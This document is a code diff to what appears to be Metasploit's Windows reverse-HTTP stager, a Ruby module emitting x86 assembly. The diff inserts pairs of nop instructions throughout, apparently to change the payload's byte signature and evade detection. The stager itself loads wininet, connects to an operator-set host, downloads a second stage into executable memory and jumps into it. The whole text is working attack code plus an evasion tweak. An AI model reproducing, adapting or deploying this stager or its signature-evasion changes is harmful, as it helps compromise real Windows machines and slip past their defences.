@@ -250,8 +250,12 @@ module Payload::Windows::ReverseHttp
       ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)
       load_wininet:
         push 0x0074656e        ; Push the bytes 'wininet',0 onto the stack.
+        nop
+        nop
         push 0x696e6977        ; ...
         push esp               ; Push a pointer to the "wininet" string on the stack.
+        nop
+        nop
         push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
         call ebp               ; LoadLibraryA( "wininet" )
         xor ebx, ebx           ; Set ebx to NULL to use in future arguments
@@ -260,10 +264,14 @@ module Payload::Windows::ReverseHttp
     asm << %Q^
     internetopen:
       push ebx               ; DWORD dwFlags
+      nop
+      nop
     ^
     if proxy_enabled
       asm << %Q^
         push esp               ; LPCTSTR lpszProxyBypass ("" = empty string)
+        nop
+        nop
       call get_proxy_server
         db "#{proxy_info}", 0x00
       get_proxy_server:
@@ -273,6 +281,8 @@ module Payload::Windows::ReverseHttp
     else
       asm << %Q^
         push ebx               ; LPCTSTR lpszProxyBypass (NULL)
+        nop
+        nop
         push ebx               ; LPCTSTR lpszProxyName (NULL)
         push ebx               ; DWORD dwAccessType (PRECONFIG = 0)
       ^
@@ -280,9 +290,13 @@ module Payload::Windows::ReverseHttp
     if opts[:ua].nil?
       asm << %Q^
         push ebx               ; LPCTSTR lpszAgent (NULL)
+        nop
+        nop
       ^
     else
       asm << %Q^
+        nop
+        nop
         push ebx               ; LPCTSTR lpszProxyBypass (NULL)
       call get_useragent
         db "#{opts[:ua]}", 0x00
@@ -292,24 +306,36 @@ module Payload::Windows::ReverseHttp
     end
     asm << %Q^
       push #{Rex::Text.block_api_hash('wininet.dll', 'InternetOpenA')}
+      nop
+      nop
       call ebp
     ^
 
     asm << %Q^
       internetconnect:
         push ebx               ; DWORD_PTR dwContext (NULL)
+        nop
+        nop
         push ebx               ; dwFlags
         push 3                 ; DWORD dwService (INTERNET_SERVICE_HTTP)
         push ebx               ; password (NULL)
+        nop
+        nop
         push ebx               ; username (NULL)
+        nop
+        nop
         push #{opts[:port]}    ; PORT
         call got_server_uri    ; double call to get pointer for both server_uri and
       server_uri:              ; server_host; server_uri is saved in EDI for later
         db "#{opts[:url]}", 0x00
       got_server_host:
         push eax               ; HINTERNET hInternet (still in eax from InternetOpenA)
+        nop
+        nop
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetConnectA')}
         call ebp
+        nop
+        nop
         mov esi, eax           ; Store hConnection in esi
     ^
 
@@ -320,14 +346,22 @@ module Payload::Windows::ReverseHttp
       asm << %Q^
         ; DWORD dwBufferLength (length of username)
         push #{proxy_user.length}
+        nop
+        nop
         call set_proxy_username
       proxy_username:
+        nop
+        nop
         db "#{proxy_user}",0x00
       set_proxy_username:
                              ; LPVOID lpBuffer (username from previous call)
         push 43              ; DWORD dwOption (INTERNET_OPTION_PROXY_USERNAME)
+        nop
+        nop
         push esi             ; hConnection
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
+        nop
+        nop
         call ebp
       ^
     end
@@ -336,12 +370,18 @@ module Payload::Windows::ReverseHttp
       asm << %Q^
         ; DWORD dwBufferLength (length of password)
         push #{proxy_pass.length}
+        nop
+        nop
         call set_proxy_password
       proxy_password:
+        nop
+        nop
         db "#{proxy_pass}",0x00
       set_proxy_password:
                              ; LPVOID lpBuffer (password from previous call)
         push 44              ; DWORD dwOption (INTERNET_OPTION_PROXY_PASSWORD)
+        nop
+        nop
         push esi             ; hConnection
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
         call ebp
@@ -352,12 +392,18 @@ module Payload::Windows::ReverseHttp
       httpopenrequest:
         push ebx               ; dwContext (NULL)
         push #{"0x%.8x" % http_open_flags}   ; dwFlags
+        nop
+        nop
         push ebx               ; accept types
         push ebx               ; referrer
         push ebx               ; version
+        nop
+        nop
         push edi               ; server URI
         push ebx               ; method
         push esi               ; hConnection
+        nop
+        nop
         push #{Rex::Text.block_api_hash('wininet.dll', 'HttpOpenRequestA')}
         call ebp
         xchg esi, eax          ; save hHttpRequest in esi
@@ -367,6 +413,8 @@ module Payload::Windows::ReverseHttp
       ; Store our retry counter in the edi register
       set_retry:
         push #{retry_count}
+        nop
+        nop
         pop edi
       ^
     end
@@ -379,13 +427,19 @@ module Payload::Windows::ReverseHttp
       asm << %Q^
       ; InternetSetOption (hReq, INTERNET_OPTION_SECURITY_FLAGS, &dwFlags, sizeof (dwFlags) );
       set_security_options:
+        nop
+        nop
         push 0x#{secure_flags.to_s(16)}
        mov eax, esp
         push 4                 ; sizeof(dwFlags)
         push eax               ; &dwFlags
+        nop
+        nop
         push 31                ; DWORD dwOption (INTERNET_OPTION_SECURITY_FLAGS)
         push esi               ; hHttpRequest
         push #{Rex::Text.block_api_hash('wininet.dll', 'InternetSetOptionA')}
+        nop
+        nop
         call ebp
       ^
     end
@@ -393,32 +447,46 @@ module Payload::Windows::ReverseHttp
     asm << %Q^
       httpsendrequest:
         push ebx               ; lpOptional length (0)
+        nop
+        nop
         push ebx               ; lpOptional (NULL)
     ^
 
     if custom_headers
       asm << %Q^
         push -1                ; dwHeadersLength (assume NULL terminated)
+        nop
+        nop
         call get_req_headers   ; lpszHeaders (pointer to the custom headers)
         db #{custom_headers}
       get_req_headers:
       ^
     else
       asm << %Q^
+        nop
+        nop
         push ebx               ; HeadersLength (0)
+        nop
+        nop
         push ebx               ; Headers (NULL)
       ^
     end
 
     asm << %Q^
         push esi               ; hHttpRequest
+        nop
+        nop
         push #{Rex::Text.block_api_hash('wininet.dll', 'HttpSendRequestA')}
         call ebp
+        nop
+        nop
         test eax,eax
         jnz allocate_memory
 
      set_wait:
         push #{retry_wait}     ; dwMilliseconds
+        nop
+        nop
         push #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
         call ebp               ; Sleep( dwMilliseconds );
       ^
@@ -427,6 +495,8 @@ module Payload::Windows::ReverseHttp
       asm << %Q^
         try_it_again:
           dec edi
+          nop
+          nop
           jnz send_request
 
         ; if we didn't allocate before running out of retries, bail out
@@ -434,6 +504,8 @@ module Payload::Windows::ReverseHttp
     else
       asm << %Q^
         try_it_again:
+          nop
+          nop
           jmp send_request
 
         ; retry forever
@@ -450,6 +522,8 @@ module Payload::Windows::ReverseHttp
     failure:
       push 0x56A2B5F0        ; hardcoded to exitprocess for size
       call ebp
+      nop
+      nop
       ^
     end
 
@@ -457,40 +531,58 @@ module Payload::Windows::ReverseHttp
     allocate_memory:
       push 0x40              ; PAGE_EXECUTE_READWRITE
       push 0x1000            ; MEM_COMMIT
+      nop
+      nop
       push 0x00400000        ; Stage allocation (4Mb ought to do us)
       push ebx               ; NULL as we dont care where the allocation is
+      nop
+      nop
       push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
       call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
 
     download_prep:
       xchg eax, ebx          ; place the allocated base address in ebx
+      nop
+      nop
       push ebx               ; store a copy of the stage base address on the stack
       push ebx               ; temporary storage for bytes read count
+      nop
+      nop
       mov edi, esp           ; &bytesRead
 
     download_more:
       push edi               ; &bytesRead
       push 8192              ; read length
+      nop
+      nop
       push ebx               ; buffer
       push esi               ; hRequest
       push #{Rex::Text.block_api_hash('wininet.dll', 'InternetReadFile')}
       call ebp
 
       test eax,eax           ; download failed? (optional?)
+      nop
+      nop
       jz failure
 
       mov eax, [edi]
       add ebx, eax           ; buffer += bytes_received
 
+      nop
+      nop
       test eax,eax           ; optional?
       jnz download_more      ; continue until it returns 0
       pop eax                ; clear the temporary storage
 
     execute_stage:
+      nop
+      nop
       ret                    ; dive into the stored stage address
 
     got_server_uri:
       pop edi
+      nop
+      nop
       call got_server_host
 
     server_host:
